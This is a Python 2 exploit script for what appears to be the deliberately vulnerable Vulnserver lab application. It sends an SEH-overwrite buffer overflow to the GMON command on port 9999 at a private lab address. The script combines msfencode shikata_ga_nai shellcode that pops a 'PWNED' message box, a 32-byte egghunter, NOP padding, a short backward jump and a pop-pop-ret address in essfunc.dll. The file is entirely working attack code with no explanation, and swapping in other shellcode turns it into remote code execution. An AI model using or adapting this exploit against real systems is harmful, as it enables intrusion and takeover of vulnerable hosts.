#! /usr/bin/python

import socket

# msfpayload windows/messagebox title="PWNED" text="Pwned by D4v3" R | msfencode -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -t c
shellcode=("\xbd\xb3\xa5\x35\x96\xda\xc5\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x42\x83\xea\xfc\x31\x6a\x0e\x03\xd9\xab\xd7\x63\xc4\x5f\x8c"
"\x55\x82\xbb\x47\x54\xb8\x76\xd0\xa6\xf5\x13\x94\xb8\x35\x57"
"\xdc\x36\xbe\x11\x3d\xcc\x86\xd5\xb6\xac\x26\x6d\xfe\x68\x69"
"\x69\x8a\x7b\x2c\x88\xa5\x83\x2f\xea\xce\x10\x8b\xcf\x5b\xad"
"\xef\x84\x08\x06\x77\x9a\x5a\xdd\xcd\x84\x11\xb8\xf1\xb5\xce"
"\xde\xc5\xfc\x9b\x15\xae\xfe\x75\x64\x4f\x31\x4a\x7b\x03\xb6"
"\x8a\xf0\x5c\x76\xc5\xf4\x63\xbf\x31\xf2\x58\x43\xe2\xd3\xeb"
"\x5a\x61\x79\x37\x9c\x9d\x18\xbc\x92\x2a\x6e\x98\xb6\xad\x9b"
"\x97\xc3\x26\x5a\x4f\x42\x7c\x79\x93\x34\xbe\x33\xa3\x9f\x94"
"\xbd\x56\x56\xd6\xd6\x16\x27\xd9\xca\x74\x50\x7a\xed\x87\x5f"
"\x0c\x57\x73\x1b\x71\x80\x99\x28\x09\x2c\x79\x9d\xfd\xc3\x7e"
"\xde\x01\x52\xc5\x29\x96\x09\xa9\x09\x27\xba\x02\x78\x89\x5e"
"\x0c\x09\xa6\xfb\xbe\x79\x14\x20\x34\xf3\x43\x7e\xb7\x56\x88"
"\xf6\x85\x09\x2b\xa0\xab\xe7\xf7\x36\xb7\xd3\x55\xd1\xa6\xe4"
"\xa5\xde\x40\x5f\x02\x01\xb0\x37\xe2\x16\xfe\x82\x33\x42\x76"
"\x50\x10\x71\x0f\x8a\x30\x4a\x57\x6d\xe1\xc4\x47\x29\xd5\x62"
"\xef\xd5\x35\xe9\x96\x7d\x66\x9a\x06\x1b\xb7\xad\x5e\xaf\x93"
"\x20\xd7\xd1\xed\xe8\xb5\x42\x5f\x5f\xc6\xb5\x6e\x9f\x68\xc9"
"\xc4\x17")

#Egghunter , tag D4v3 :  Size 32 bytes
egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x44\x34\x76\x33\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#buffer="A"*3495		#Original buffer length - 4 of jump

buffer="\x90"*30		
buffer+="D4v3D4v3"+shellcode
buffer+="\x90"*30		
print len(buffer)
buffer+="\x90"*(3495-len(buffer)-35)
buffer+=egghunter
buffer+="\x90"*3		
jump="\xeb\xd6\x90\x90"		# JMP $-40 (40 is just an arbitrary value based on which align egghunter accordingly)
ppr="\xb4\x10\x50\x62" 		# Address: 0x625010b4 pop ebx pop ebp ret in essfunc.dll 

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.56.102',9999))

payload=buffer+jump+ppr
payload+=payload+ "\x90"*(4000-len(payload))

s.send('GMON /.:/'+ payload)
s.close()
